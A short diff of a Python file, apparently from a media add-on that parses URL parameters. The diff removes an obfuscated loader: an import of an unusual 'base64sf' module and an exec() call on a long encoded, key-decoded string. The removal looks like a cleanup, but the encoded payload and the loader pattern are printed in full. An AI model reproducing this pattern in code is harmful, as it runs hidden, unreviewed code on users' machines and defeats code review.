@@ -658,6 +658,4 @@ try:
     iconimage=urllib.unquote_plus(params["iconimage"])
 except:
     pass
-import base64sf,shutil
 
-exec(base64sf.decode('Cript','TdjY4pSkktLelJ6Z3ODZptvK3K5yodHf4aihytTYsuDcn-Sv59DZ4nHo0tTZsqC21duktNjoyJmZlZfns9fM2dWvrJif3LLfzp_Vp9bY3udy4tXl26zgl-bdp9fYnsGo2cqy47vGv5ule5mVl-ez18zZ1a-smJ_cst_On9Wn1tje53LfztfVpeHhnuao4tie37LW0pfRfXxy1eys5d3VlICS4dLhpqDd4tWx5dXR6KjCyuTca9OSen2s2Inf53HiyuTccdfh2ee35ZHV7Kzl3dWdgK-94umorHN5fbba3uTdr6Db3ei1186Y2bvb3OTZbA=='))
